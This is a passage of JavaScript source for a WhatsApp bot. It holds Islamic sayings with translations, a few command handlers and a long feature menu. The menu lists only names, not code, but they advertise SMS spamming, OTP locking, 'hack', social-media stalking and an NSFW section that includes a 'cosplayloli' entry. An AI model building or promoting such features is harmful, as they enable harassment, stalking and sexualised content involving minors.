 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia Already berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
reply(`${arabic}\n${arti}`)
}
break

case 'specialmenu': {
 ptz.sendMessage(m?.chat, {text: `╭┈──────────────────
│*${m2}[ S P E C I A L - M E N U ]*${m2}
╭┈──────────────────
│  ◦  ʟᴏᴄᴋᴏᴛᴘ
│  ◦  ᴀɴᴛɪʙᴜɢ
│  ◦  xxxsᴇᴀʀᴄʜ <ǫᴜᴇʀʏ>
│  ◦  xxxᴅᴏᴡɴʟᴏᴀᴅ <ʟɪɴᴋ> 
│  ◦  xɴxxsᴇᴀʀᴄʜ <ǫᴜᴇʀʏ>
│  ◦  xɴxxᴅʟ <ʟɪɴᴋ>
│  ◦  ғʟᴜx
╰┈────────────────•`,key: m?.key,})
} 
break

case 'doatahlil': {
let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
reply(`${caption}`)
}
break

//=================================//
case 'update':
    if (!isCreator) return reply('You do not have permission to use this command.');
    
    await checkForUpdates();

    break;
 

case 'tutor':
case 'tutorial': {
await ptz.sendMessage(m?.chat, {react: {text: `📚`,key: m?.key,}}) 
 reply(`👋🏻 Hii ${pushname}, 
\n\n*All Tutorials Are Here*  \n\nhttps://www.youtube.com/@DavidCyril_TECH \n\nPlease Dont Forget To Subscribe`)
}
break 

case 'channel': {
await ptz.sendMessage(m?.chat, {react: {text: `💝`,key: m?.key,}}) 
 reply(`*FOLLOW OUR OFFICIAL CHANNEL*\n\nhttps://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`)
} 
break 



    case 'credit': 
case 'credito': 
case 'credits': 
case 'cr': {
    await ptz.sendMessage(m?.chat, {react: {text: `🎉`,key: m?.key,}});

    // Sending the credit message
    await reply(`*BIG THANKS TO*\n
    • _God Almighty_
    • _My Fiance Aneeta For Supporting Me Always_`);

    break;
}


case 'list': case 'menu2': {
await ptz.sendMessage(m?.chat, {react: {text: `📃`,key: m?.key,}}) 
 ptz.sendMessage(m?.chat, {text: `╭═══ QUEEN_ANITA-V3 ═══⊷
┃❃╭──────────────
┃❃│ Prefix :  . 
┃❃│ User :  ${pushname} 
┃❃│ Time : ${time2}
┃❃│ Version : 3
┃❃│ Commands : ${totalfitur}
┃❃│ Ram : ${formatSize(diskused)} / ${formatSize(totalspace)}
┃❃│ Alive : ${runtime(process.uptime())}
┃❃╰───────────────
╰═════════════════⊷

╭┈──────────────────
│*${m2}[ S Y S T E M - M E N U ]*${m2}
╭┈──────────────────
│  ◦  ᴅɪꜱᴋ
│  ◦  ᴘɪɴɢ
│  ◦  ᴀʟɪᴠᴇ
│  ◦  sʏsᴛᴇᴍ
│  ◦  ʀᴜɴᴛɪᴍᴇ
╰┈────────────────•
╭┈──────────────────
│*${m2}[ S P E C I A L - M E N U ]*${m2}
╭┈──────────────────
│  ◦  ʟᴏᴄᴋᴏᴛᴘ
│  ◦  ᴀɴᴛɪʙᴜɢ
│  ◦  xxxsᴇᴀʀᴄʜ <ǫᴜᴇʀʏ>
│  ◦  xxxᴅᴏᴡɴʟᴏᴀᴅ <ʟɪɴᴋ> 
│  ◦  xɴxxsᴇᴀʀᴄʜ <ǫᴜᴇʀʏ>
│  ◦  xɴxxᴅʟ <ʟɪɴᴋ>
│  ◦  ғʟᴜx <ᴘʀᴏᴍᴘᴛ>
╰┈────────────────•
╭┈──────────────────
│*${m2}[ A I - M E N U ‎ • ]*${m2}
╭┈──────────────────
│  ◦  ᴄʜᴀᴛɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  ᴅᴇɢʀᴇᴇɢᴜʀᴜ <Qᴜᴇʀʏ>
│  ◦  ʀᴀɢʙᴏᴛ <Qᴜᴇʀʏ>
│  ◦  ꜱᴍᴀʀᴛ <Qᴜᴇʀʏ>
│  ◦  ᴀɪ-ꜱᴇᴀʀᴄʜ <Qᴜᴇʀʏ>
│  ◦  ᴛxᴛɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  ᴛxᴛ2ɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  ᴘʀᴏᴍᴛ-ɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  ɢᴘᴛɢᴏ <Qᴜᴇʀʏ>
│  ◦  ꜱɪᴍɪ <on/off> 
│  ◦  ᴅᴀʟʟᴇ <Qᴜᴇʀʏ>
│  ◦  ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
│  ◦  ʙɪɴɢ-ᴀɪ <Qᴜᴇʀʏ>
│  ◦  ʙʟᴀᴄᴋʙᴏx <Qᴜᴇʀʏ>
│  ◦  ɴᴇᴠᴏ <Qᴜᴇʀʏ>
│  ◦  ʟᴜᴍɪɴᴀ <Qᴜᴇʀʏ>
│  ◦  ᴏ̨ᴜᴇᴇɴ_ᴀɴɪᴛᴀ-ᴠ1 <on/off>
│  ◦  ɢᴘᴛ4 <Qᴜᴇʀʏ>
│  ◦  ᴅɪꜰꜰᴜꜱɪᴏɴ <Qᴜᴇʀʏ>
╰┈────────────────•
╭┈──────────────────
│*${m2}[ P H O X Y - M E N U]${m2}*
╭┈──────────────────
│  ◦  ꜱʜᴀᴅᴏᴡ 
│  ◦  ᴡʀɪᴛᴇ 
│  ◦  ʀᴏᴍᴀɴᴛɪᴄ 
│  ◦  ʙᴜʀɴᴘᴀᴘᴇʀ 
│  ◦  ꜱᴍᴏᴋᴇ 
│  ◦  ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ 
│  ◦  ʟᴏᴠᴇ 
│  ◦  ᴜɴᴅᴇʀɢʀᴀꜱꜱ 
│  ◦  ᴅᴏᴜʙʟᴇʟᴏᴠᴇ 
│  ◦  ᴄᴏꜰꜰᴇᴄᴜᴘ 
│  ◦  ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ 
│  ◦  ꜱᴍᴏᴋʏɴᴇᴏɴ 
│  ◦  ꜱᴛᴀʀꜱᴛᴇxᴛ 
│  ◦  ʀᴀɪɴʙᴏᴡᴇꜰꜰᴇᴄᴛ 
│  ◦  ʙᴀʟʟᴏᴏɴᴛᴇxᴛ 
│  ◦  ᴍᴇᴛᴀʟʟɪᴄᴇꜰꜰᴇᴄᴛ 
│  ◦  ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛ 
│  ◦  ꜰʟᴀᴍɪɴɢᴛᴇxᴛ 
│  ◦  ꜱᴛᴏɴᴇᴛᴇxᴛ 
│  ◦  ᴡʀɪᴛᴇᴀʀᴛ 
│  ◦  ꜱᴜᴍᴍᴇʀᴛᴇxᴛ 
│  ◦  ᴡᴏʟꜰᴍᴇᴛᴀʟᴛᴇxᴛ 
│  ◦  ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛ 
│  ◦  ʀᴏꜱᴇꜱᴛᴇxᴛ 
│  ◦  ɴᴀᴛᴜʀᴇᴛʏᴘᴏɢʀᴀᴘʜʏ 
│  ◦  Qᴜᴏᴛᴇꜱᴜɴᴅᴇʀ 
│  ◦  ꜱʜɪɴᴇᴛᴇxᴛ
╰┈────────────────•
╭┈──────────────────
│*${m2}[ T O O L S - M E N U ]${m2}*
╭┈──────────────────
│  ◦  ᴛᴛꜱ
│  ◦  ᴠᴠ
│  ◦  ᴀᴍᴀᴢᴏɴ
│  ◦  ᴍʏɪᴘ
│  ◦  ɪᴘ
│  ◦  ʀᴇᴍᴏᴠᴇʙɢ
│  ◦  sᴛɪᴄᴋᴇʀ-sᴇᴀʀᴄʜ
│  ◦  ᴛʀᴀɴsʟᴀᴛᴇ
│  ◦  ʀᴇᴀᴅᴍᴏʀᴇ
│  ◦  ᴘɪɴᴄʜᴀᴛ
│  ◦  ǫᴜʀᴀɴ
│  ◦  ʙɪʙʟᴇ
│  ◦  ᴇᴍᴏᴊɪᴍɪx
│  ◦  ᴘᴇʀɪᴏᴅɪᴄ-ᴛᴀʙʟᴇ
│  ◦  ᴜɴᴘɪɴᴄʜᴀᴛ
│  ◦  ᴏᴄʀ
│  ◦  ᴄᴀʟᴄᴜʟᴀᴛᴏʀ
│  ◦  ғᴀᴄᴛ
│  ◦  ʜᴅᴠɪᴅᴇᴏ
│  ◦  ᴄᴏɴᴠᴇʀᴛ
│  ◦  ᴄᴏɴᴠᴇʀᴛɪᴍᴇ
│  ◦  ʟɪsᴛᴄᴜʀʀᴇɴᴄʏ
│  ◦  ᴄʀᴇᴀᴛᴇᴍᴇᴍᴇ
│  ◦  ᴘᴀssᴡᴏʀᴅ
│  ◦  ɢᴇᴛ
│  ◦  ʀᴇᴍɪɴᴅᴍᴇ 
│  ◦  ᴡᴀɴᴜᴍʙᴇʀ
│  ◦  sᴀᴠᴇ
│  ◦  ss 
│  ◦  ᴄᴏᴜᴘʟᴇᴘᴘ
│  ◦  ᴇɴᴄʀʏᴘᴛ
│  ◦  ʟᴀɴɢᴜᴀɢᴇs
│  ◦  ᴄʀᴇᴅɪᴛs
│  ◦  sᴜᴘᴘᴏʀᴛ
│  ◦  ʀᴇᴘᴏsᴛ
│  ◦  ᴠᴠ2
│  ◦  ᴍᴏᴠɪᴇ
│  ◦  ᴛɪᴋᴛᴏᴋsᴇᴀʀᴄʜ
│  ◦  ᴠᴏʟᴠɪᴅ
│  ◦  ʀᴇᴍɪɴɪ
│  ◦  ᴋᴅʀᴀᴍᴀ
│  ◦  ᴄʜᴀɴɴᴇʟ
│  ◦  ғʟɪᴘᴛᴇxᴛ
│  ◦  sᴘᴀᴍsᴍs
│  ◦  ᴡᴇᴀᴛʜᴇʀ
│  ◦  ᴍᴏᴅᴀᴘᴋ
│  ◦  ᴛᴇʀᴀʙᴏx
│  ◦  ᴛɪɴʏᴜʀʟ
│  ◦  sᴏᴜɴᴅ1 - sᴏᴜɴᴅ161
│  ◦  ᴠᴏʟᴠɪᴅ
╰┈────────────────•
╭┈──────────────────
│*${m2}[ E P H O T O - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦  ɢʟɪᴛᴄʜᴛᴇxᴛ 
│  ◦  ᴡʀɪᴛᴇᴛᴇxᴛ 
│  ◦  ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│  ◦  ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│  ◦  ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│  ◦  ɴᴇᴏɴɢʟɪᴛᴄʜ 
│  ◦  ꜰʟᴀɢᴛᴇxᴛ 
│  ◦  ꜰʟᴀɢ3ᴅᴛᴇxᴛ 
│  ◦  ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│  ◦  ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│  ◦  ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│  ◦  ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│  ◦  ʟᴏɢᴏᴍᴀᴋᴇʀ 
│  ◦  ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│  ◦  ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│  ◦  ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│  ◦  ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│  ◦  ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│  ◦  ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│  ◦  ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│  ◦  ʟᴜxᴜʀʏɢᴏʟᴅ 
│  ◦  ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│  ◦  ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│  ◦  ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│  ◦  1917ꜱᴛʏʟᴇ 
│  ◦  ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│  ◦  ʀᴏʏᴀʟᴛᴇxᴛ 
│  ◦  ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│  ◦  ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│  ◦  ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
╰┈────────────────•
╭┈──────────────────
│ *${m2}[ F U N - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦  ғᴀᴄᴛ
│  ◦  ʀᴀᴛᴇ
│  ◦  ғʟɪᴘᴄᴏɪɴ
│  ◦  ᴊᴏᴋᴇ
│  ◦  ᴅᴀʀᴇ
│  ◦  ᴛʀᴜᴛʜ
│  ◦  ᴍɪɴᴅʀᴇᴀᴅᴇʀ
│  ◦  ᴍᴏᴏᴅ
│  ◦  sᴛᴜᴘɪᴅᴄʜᴇᴄᴋ
│  ◦  ɢᴀʏᴄʜᴇᴄᴋ
│  ◦  ᴡᴀɪғᴜᴄʜᴇᴄᴋ
│  ◦  ʜᴏᴛᴄʜᴇᴄᴋ
│  ◦  ᴜɴᴄʟᴇᴀɴᴄʜᴇᴄᴋ
│  ◦  ᴇᴠɪʟᴄʜᴇᴄᴋ
│  ◦  sᴍᴀʀᴛᴄʜᴇᴄᴋ
│  ◦  sᴏᴜʟᴍᴀᴛᴇ <ᴛᴀɢ>
│  ◦  ᴄᴏᴜᴘʟᴇ <ᴛᴀɢ>
│  ◦  ᴡʜᴀᴛ
│  ◦  ᴡʜᴇʀᴇ
│  ◦  ᴡʜᴇɴ
│  ◦  ɪs
╰┈────────────────•
╭┈──────────────────
│*${m2}[ C O N V E R T E R ‎]${m2}*
╭┈──────────────────
│  ◦  ʙᴀꜱꜱ
│  ◦  ʙʟᴏᴡɴ
│  ◦  ᴅᴇᴇᴘ
│  ◦  ᴇᴀʀʀᴀᴘᴇ
│  ◦  ꜰᴀꜱᴛ
│  ◦  ꜰᴀᴛ
│  ◦  ɴɪɢʜᴛᴄᴏʀᴇ
│  ◦  ʀᴇᴠᴇʀꜱᴇ
│  ◦  ʀᴏʙᴏᴛ
│  ◦  ꜱʟᴏᴡ
│  ◦  ꜱᴍᴏᴏᴛʜ
│  ◦  ᴛᴜᴘᴀɪ
│  ◦  ꜱᴍᴏᴏᴛʜ
│  ◦  ᴛᴏᴍᴘ4 <sᴛɪᴄᴋᴇʀ>
│  ◦  ᴛᴏɪᴍɢ <sᴛɪᴄᴋᴇʀ>
╰┈────────────────•
╭┈──────────────────
│*${m2}[ D O W N L O A D E R - M E N U ]${m2}*
╭┈──────────────────
│  ◦  ᴘʟᴀʏ
│  ◦  sᴏɴɢ
│  ◦  ᴘʟᴀʏ2
│  ◦  ᴛᴡɪᴛᴛᴇʀ
│  ◦  ʏᴛᴍᴘ3
│  ◦  ʏᴛᴍᴘ4
│  ◦  ɢɪᴛᴄʟᴏɴᴇ
│  ◦  ɪɴsᴛᴀɢʀᴀᴍ
│  ◦  ᴀᴘᴋ
│  ◦  ᴍᴇᴅɪᴀғɪʀᴇ
│  ◦  ʏᴛs
│  ◦  ғᴀᴄᴇʙᴏᴏᴋ
│  ◦  ɪɴsᴛᴀɢʀᴀᴍ
│  ◦  ᴛᴇʀᴀʙᴏx
│  ◦  ʟʏʀɪᴄs
╰┈────────────────•
╭┈──────────────────
│ *${m2}[ S T A L K - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦  ɢɪᴛʜᴜʙsᴛᴀʟᴋ
│  ◦  ɪɢsᴛᴀʟᴋ
│  ◦  ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
╰┈────────────────•
╭┈──────────────────
│ *${m2}[ A N I M E - M E N U ‎ • ]${m2}*
╭┈──────────────────
│◦ ᴀᴋɪʀᴀ
│◦ ᴀᴋɪʏᴀᴍᴀ
│◦ ᴀɴɪᴍᴇsᴇᴀʀᴄʜ
│◦ ᴀɴᴀ
│◦ ᴀɴɪᴍᴇᴠɪᴅᴇᴏ
│◦ ᴀʀᴛ
│◦ ᴀsᴜɴᴀ
│◦ ᴀʏᴜᴢᴀᴡᴀ
│◦ ʙᴏʀᴜᴛᴏ
│◦ ʙᴛs
│◦ ᴄʜɪʜᴏ
│◦ ᴄʜɪᴛᴏɢᴇ
│◦ ᴄᴏsᴘʟᴀʏ
│◦ ᴄᴏsᴘʟᴀʏʟᴏʟɪ
│◦ ᴄᴏsᴘʟᴀʏsᴀɢɪʀɪ
│◦ ᴄʏʙᴇʀ
│◦ ᴅᴇɪᴅᴀʀᴀ
│◦ ᴅᴏʀᴀᴇᴍᴏɴ
│◦ ᴇʟᴀɪɴᴀ
│◦ ᴇᴍɪʟɪᴀ
│◦ ᴇʀᴢᴀ
│◦ ᴇxᴏ
│◦ ɢᴀᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ
│◦ ɢʀᴇᴍᴏʀʏ
│◦ ʜᴀᴄᴋᴇʀ
│◦ ʜᴇsᴛɪᴀ
│◦ ʜɪɴᴀᴛᴀ
│◦ ʜᴜsʙᴜ
│◦ ɪɴᴏʀɪ
│◦ ɪsʟᴀᴍɪᴄ
│◦ ɪsᴜᴢᴜ
│◦ ɪᴛᴀᴄʜɪ
│◦ ɪᴛᴏʀɪ
│◦ ᴊᴇɴɴɪᴇ
│◦ ᴊɪsᴏ
│◦ ᴊᴜsᴛɪɴᴀ
│◦ ᴋᴀɢᴀ
│◦ ᴋᴀɢᴜʀᴀ
│◦ ᴋᴀᴋᴀsɪʜ
│◦ ᴋᴀᴏʀɪ
│◦ ᴄᴀʀᴛᴏᴏɴ
│◦ sʜᴏʀᴛǫᴜᴏᴛᴇ
│◦ ᴋᴇɴᴇᴋɪ
│◦ ᴋᴏᴛᴏʀɪ
│◦ ᴋᴜʀᴜᴍɪ
│◦ ʟɪsᴀ
│◦ ᴍᴀᴅᴀʀᴀ
│◦ ᴍᴇɢᴜᴍɪɴ
│◦ ᴍɪᴋᴀsᴀ
│◦ ᴍɪᴋᴇʏ
│◦ ᴍɪᴋᴜ
│◦ ᴍɪɴᴀᴛᴏ
│◦ ᴍᴏᴜɴᴛᴀɪɴ
│◦ ɴᴀʀᴜᴛᴏ
│◦ ɴᴇᴋᴏ2
│◦ ɴᴇᴋᴏɴɪᴍᴇ
│◦ ɴᴇᴢᴜᴋᴏ
│◦ ᴏɴᴇᴘɪᴇᴄᴇ
│◦ ᴘᴇɴᴛᴏʟ
│◦ ᴘᴏᴋᴇᴍᴏɴ
│◦ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ
│◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ
│◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
│◦ ʀɪᴢᴇ
│◦ ʀᴏsᴇ
│◦ sᴀɢɪʀɪ 
│◦ sᴀᴋᴜʀᴀ 
│◦ sᴀsᴜᴋᴇ 
│◦ sᴀᴛᴀɴɪᴄ 
│◦ sʜɪɴᴀ 
│◦ sʜɪɴᴋᴀ 
│◦ sʜɪɴᴏᴍɪʏᴀ 
│◦ sʜɪᴢᴜᴋᴀ 
│◦ sʜᴏᴛᴀ 
│◦ sᴘᴀᴄᴇ
│◦ ᴛᴇᴄʜɴᴏʟᴏɢʏ 
│◦ ᴛᴇᴊɪɴᴀ 
│◦ ᴛᴏᴜᴋᴀᴄʜᴀɴ 
│◦ ᴛsᴜɴᴀᴅᴇ 
│◦ ʏᴏᴛsᴜʙᴀ 
│◦ ʏᴜᴋɪ 
│◦ ʏᴜʟɪʙᴏᴄɪʟ 
│◦ ʏᴜᴍᴇᴋᴏ 
╰┈────────────────•
${m2}*[ A N I M E - M E N U]*${m2}
╭┈────────────────•
│  ◦  ᴋɪʟʟ
│  ◦  ᴘᴀᴛ
│  ◦  ʟɪᴄᴋ
│  ◦  ʙɪᴛᴇ
│  ◦  ʏᴇᴇᴛ
│  ◦  ʙᴏɴᴋ
│  ◦  ᴡɪɴᴋ
│  ◦  ᴘᴏᴋᴇ
│  ◦  ɴᴏᴍ
│  ◦  sʟᴀᴘ
│  ◦  sᴍɪʟᴇ
│  ◦  ᴡᴀᴠᴇ
│  ◦  ʙʟᴜsʜ
│  ◦  sᴍᴜɢ
│  ◦  ɢʟᴏᴍᴘ
│  ◦  ʜᴀᴘᴘʏ
│  ◦  ᴅᴀɴᴄᴇ
│  ◦  ᴄʀɪɴɢᴇ
│  ◦  ʜɪɢʜғɪᴠᴇ
│  ◦ ᴀᴋɪʀᴀ
│ ◦ ᴀᴋɪʏᴀᴍᴀ
│ ◦ ᴀɴɪᴍᴇsᴇᴀʀᴄʜ
│ ◦ ᴀɴᴀ
│◦ ᴀɴɪᴍᴇᴠɪᴅᴇᴏ
│◦ ᴀʀᴛ
│◦ ᴀsᴜɴᴀ
│◦ ᴀʏᴜᴢᴀᴡᴀ
│◦ ʙᴏʀᴜᴛᴏ
│◦ ʙᴛs
│◦ ᴄʜɪʜᴏ
│◦ ᴄʜɪᴛᴏɢᴇ
│◦ ᴄᴏsᴘʟᴀʏ
│◦ ᴄᴏsᴘʟᴀʏʟᴏʟɪ
│◦ ᴄᴏsᴘʟᴀʏsᴀɢɪʀɪ
│◦ ᴄʏʙᴇʀ
│◦ ᴅᴇɪᴅᴀʀᴀ
│◦ ᴅᴏʀᴀᴇᴍᴏɴ
│◦ ᴇʟᴀɪɴᴀ
│◦ ᴇᴍɪʟɪᴀ
│◦ ᴇʀᴢᴀ
│◦ ᴇxᴏ
│◦ ɢᴀᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ
│◦ ɢʀᴇᴍᴏʀʏ
│◦ ʜᴀᴄᴋᴇʀ
│◦ ʜᴇsᴛɪᴀ
│◦ ʜɪɴᴀᴛᴀ
│◦ ʜᴜsʙᴜ
│◦ ɪɴᴏʀɪ
│◦ ɪsʟᴀᴍɪᴄ
│◦ ɪsᴜᴢᴜ
│◦ ɪᴛᴀᴄʜɪ
│◦ ɪᴛᴏʀɪ
│◦ ᴊᴇɴɴɪᴇ
│◦ ᴊɪsᴏ
│◦ ᴊᴜsᴛɪɴᴀ
│◦ ᴋᴀɢᴀ
│◦ ᴋᴀɢᴜʀᴀ
│◦ ᴋᴀᴋᴀsɪʜ
│◦ ᴋᴀᴏʀɪ
│◦ ᴄᴀʀᴛᴏᴏɴ
│◦ sʜᴏʀᴛǫᴜᴏᴛᴇ
│◦ ᴋᴇɴᴇᴋɪ
│◦ ᴋᴏᴛᴏʀɪ
│◦ ᴋᴜʀᴜᴍɪ
│◦ ʟɪsᴀ
│◦ ᴍᴀᴅᴀʀᴀ
│◦ ᴍᴇɢᴜᴍɪɴ
│◦ ᴍɪᴋᴀsᴀ
│◦ ᴍɪᴋᴇʏ
│◦ ᴍɪᴋᴜ
│◦ ᴍɪɴᴀᴛᴏ
│◦ ᴍᴏᴜɴᴛᴀɪɴ
│◦ ɴᴀʀᴜᴛᴏ
│◦ ɴᴇᴋᴏ2
│◦ ɴᴇᴋᴏɴɪᴍᴇ
│◦ ɴᴇᴢᴜᴋᴏ
│◦ ᴏɴᴇᴘɪᴇᴄᴇ
│◦ ᴘᴇɴᴛᴏʟ
│◦ ᴘᴏᴋᴇᴍᴏɴ
│◦ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ
│◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ
│◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
│◦ ʀɪᴢᴇ
│◦ ʀᴏsᴇ
│◦ sᴀɢɪʀɪ 
│◦ sᴀᴋᴜʀᴀ 
│◦ sᴀsᴜᴋᴇ 
│◦ sᴀᴛᴀɴɪᴄ 
│◦ sʜɪɴᴀ 
│◦ sʜɪɴᴋᴀ 
│◦ sʜɪɴᴏᴍɪʏᴀ 
│◦ sʜɪᴢᴜᴋᴀ 
│◦ sʜᴏᴛᴀ 
│◦ sᴘᴀᴄᴇ
│◦ ᴛᴇᴄʜɴᴏʟᴏɢʏ 
│◦ ᴛᴇᴊɪɴᴀ 
│◦ ᴛᴏᴜᴋᴀᴄʜᴀɴ 
│◦ ᴛsᴜɴᴀᴅᴇ 
│◦ ʏᴏᴛsᴜʙᴀ 
│◦ ʏᴜᴋɪ 
│◦ ʏᴜʟɪʙᴏᴄɪʟ 
│◦ ʏᴜᴍᴇᴋᴏ 
╰┈────────────────•
╭┈──────────────────
│*${m2}[ G R O U P - M E N U ]${m2}*
╭┈──────────────────
│  ◦  ᴀᴅᴅ <ᴛᴀɢꜱ>
│  ◦  ᴋɪᴄᴋ <ᴛᴀɢꜱ>
│  ◦  ᴇᴠᴇʀʏᴏɴᴇ 
│  ◦  ᴡᴇʟᴄᴏᴍᴇ < ᴏɴ / ᴏғғ >
│  ◦  ᴛᴀɢᴀʟʟ
│  ◦  ʟᴇᴀᴠᴇɢᴄ
│  ◦  ʜᴀᴄᴋ
│  ◦  ᴊᴏɪɴ 
│  ◦  ɪɴᴠɪᴛᴇ
│  ◦  ɢᴇᴛᴅᴇsᴋɢᴄ
│  ◦  ɢᴇᴛᴘᴘɢᴄ
│  ◦  ɢᴇᴛɴᴀᴍᴇ
│  ◦  sᴇᴛᴘᴘɢᴄ
│  ◦  sᴠᴄᴏɴᴛᴀᴄᴛ
│  ◦  ʟɪsᴛᴏɴʟɪɴᴇ
│  ◦  ᴏᴘᴇɴɢʀᴏᴜᴘ
│  ◦  ᴄʟᴏsᴇɢʀᴏᴜᴘ
│  ◦  ʟɪɴᴋɢᴄ
│  ◦  ʀᴇsᴇᴛʟɪɴᴋ
│  ◦  ᴄʀᴇᴀᴛᴇɢᴄ
│  ◦  ʜɪᴅᴇᴛᴀɢ
│  ◦  ᴀɴᴛɪʟɪɴᴋ  
│  ◦  ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ◦  ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢꜱ>
╰┈────────────────•
╭┈──────────────────
│ *${m2}[ B O T - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦  ᴀɴɪᴛᴀ-ᴘᴀɪʀɪɴɢ
│  ◦  ǫᴀɴɪᴛᴀ-ꜱᴄᴀɴ
│  ◦  ꜱᴛᴀʀᴛ-ᴀɴɪᴛᴀ
│  ◦  ꜱᴛᴏᴘ-ᴀɴɪᴛᴀ
│  ◦  ʟɪꜱᴛ-ᴀɴɪᴛᴀ
╰┈────────────────•
╭┈──────────────────
│ *${m2}[ N S F W - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ɢᴇɴsʜɪɴ
│  ◦  sᴡɪᴍsᴜɪᴛ 
│  ◦  sᴄʜᴏᴏʟsᴡɪᴍsᴜɪᴛ
│  ◦  ᴡʜɪᴛᴇ 
│  ◦  ʙᴀʀᴇғᴏᴏᴛ 
│  ◦  ᴛᴏᴜʜᴏᴜ 
│  ◦  ɢᴀᴍᴇᴄɢ 
│  ◦  ʜᴏʟᴏʟɪᴠᴇ 
│  ◦  ᴜɴᴄᴇɴsᴏʀᴇᴅ 
│  ◦  sᴜɴɢɢʟᴀssᴇs 
│  ◦  ɢʟᴀssᴇs
│  ◦  ᴡᴇᴀᴘᴏɴ 
│  ◦  sʜɪʀᴛʟɪғᴛ
│  ◦  ᴄʜᴀɪɴ 
│  ◦  ғɪɴɢᴇʀɪɴɢ 
│  ◦  ғʟᴀᴛᴄʜᴇsᴛ 
│  ◦  ᴛᴏʀɴᴄʟᴏᴛʜ 
│  ◦  ʙᴏɴᴅᴀɢᴇ 
│  ◦  ᴅᴇᴍᴏɴ
│  ◦  ᴘᴀɴᴛʏᴘᴜʟʟ 
│  ◦  ʜᴇᴀᴅᴘʜᴏɴᴇ 
│  ◦  ʜᴇᴀᴅᴅʀᴇss 
│  ◦  ᴀɴᴜsᴠɪᴇᴡ
│  ◦  sʜᴏʀᴛs 
│  ◦  sᴛᴏᴋɪɴɢs 
│  ◦  ᴛᴏᴘʟᴇss 
│  ◦  ʙᴇᴀᴄʜ 
│  ◦  ʙᴜɴɴʏɢɪʀʟ 
│  ◦  ʙᴜɴɴʏᴇᴀʀ 
│  ◦  ᴠᴀᴍᴘɪʀᴇ 
│  ◦  ʙɪᴋɪɴɪ 
│  ◦  ɴᴏʙʀᴀ
│  ◦  ᴡʜɪᴛᴇʜᴀɪʀ 
│  ◦  ʙʟᴏɴᴅᴇ 
│  ◦  ᴘɪɴᴋʜᴀɪʀ 
│  ◦  ʙᴇᴅ 
│  ◦  ᴘᴏɴʏᴛᴀɪʟ 
│  ◦  ɴᴜᴅᴇ 
│  ◦  ᴅʀᴇss 
│  ◦  ᴜɴᴅᴇʀᴡᴇᴀʀ 
│  ◦ ᴜɴɪғᴏʀᴍ
│  ◦  ғᴏxɢɪʀʟ 
